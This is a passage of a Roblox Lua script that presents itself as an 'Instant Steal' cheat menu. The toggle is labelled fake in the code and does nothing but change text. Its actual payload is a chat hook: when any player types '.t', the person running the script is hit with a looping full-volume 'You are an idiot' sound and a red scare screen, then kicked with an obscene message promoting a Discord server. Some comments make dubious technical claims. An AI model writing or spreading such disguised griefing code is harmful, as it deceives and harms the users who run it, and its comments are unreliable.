Info.Text = "discord.gg/YVJgMWK92k"
Info.TextColor3 = Color3.fromRGB(200,200,200)
Info.Font = Enum.Font.Gotham
Info.TextSize = 13
Info.TextXAlignment = Enum.TextXAlignment.Center

-- Fake Toggle
local enabled = false
local function UpdateButton()
    enabled = not enabled
    Button.Text = enabled and "Instant Steal\nACTIVE" or "Instant Steal\nR To Activate"
    Grad.Color = enabled and ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(0,80,0)), ColorSequenceKeypoint.new(1,Color3.fromRGB(0,120,20))} or ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(40,40,40)), ColorSequenceKeypoint.new(1,Color3.fromRGB(60,60,60))}
    Info.Text = enabled and "Running..." or "discord.gg/brainrotworld"
end
Button.MouseButton1Click:Connect(UpdateButton)
UserInputService.InputBegan:Connect(function(i, gp)
    if not gp and i.KeyCode == Enum.KeyCode.R then UpdateButton() end
end)

--// .t TROLL WITH EXACT YOUTUBE VIRUS SOUND
local function IdiotTroll()
    -- EXACT SOUND FROM YOUR YOUTUBE LINK: "You are an idiot HAHAHAHAHA!" (full virus clip, survives kick)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://131961136"  -- Direct match to the video: voice + maniacal "HA HA HA HAHAHAHAHA"
    sound.Volume = 10  -- Full blast
    sound.Looped = true  -- Loops the laugh for eternal suffering
    sound.Parent = workspace  -- Bypasses throttling
    sound.TimePosition = 0  -- Instant start
    sound:Play()
    task.wait(0.2)  -- Preload
    sound:Destroy()  -- Forces PlayOnRemove â€“ keeps echoing through kick

    -- Troll Screen
    local gui = Instance.new("ScreenGui")
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999999999
    gui.ResetOnSpawn = false
    gui.Parent = CoreGui

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(255,0,0)
    bg.BackgroundTransparency = 0.15

    -- Creepy avatar
    local avatar = Instance.new("ImageLabel", gui)
    avatar.Size = UDim2.new(0.7,0,0.7,0)
    avatar.Position = UDim2.new(0.15,0,0.15,0)
    avatar.BackgroundTransparency = 1
    avatar.Image = "rbxassetid://15610877418"  -- Creepy smile (loads perfectly)
    avatar.ScaleType = Enum.ScaleType.Fit

    -- Text
    local text = Instance.new("TextLabel", gui)
    text.Size = UDim2.new(1,0,0.25,0)
    text.Position = UDim2.new(0,0,0.75,0)
    text.BackgroundTransparency = 1
    text.Text = "YOU ARE AN IDIOT\nHAHAHAHAHAHA!"
    text.TextColor3 = Color3.new(1,1,1)
    text.TextStrokeTransparency = 0
    text.TextStrokeColor3 = Color3.new(0,0,0)
    text.Font = Enum.Font.Arcade
    text.TextScaled = true

    -- Flash + cleanup after 8 seconds (let the laugh loop)
    bg:TweenSize(UDim2.new(1.1,0,1.1,0), "Out", "Quad", 3, true)
    task.delay(8, function() gui:Destroy() end)
end

--// Connect .t to all players
local function ConnectTroll(plr)
    plr.Chatted:Connect(function(msg)
        if msg:lower() == ".t" then
            IdiotTroll()
            task.wait(0.8)  -- Buffer for sound to kick in
            LocalPlayer:Kick("ðŸ¤¡ Get fucked by Tokinu Hub ðŸ¤¡  discord.gg/YVJgMWK92k ðŸ¤¡")
        end
    end)
end
Players.PlayerAdded:Connect(ConnectTroll)
for _, plr in ipairs(Players:GetPlayers()) do ConnectTroll(plr) end

--// Draggable GUI (from original)
local dragging, dragInput, dragStart, startPos
local function updateInput(input)
    local delta = input.Position - dragStart
    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then updateInput(input) end
end)

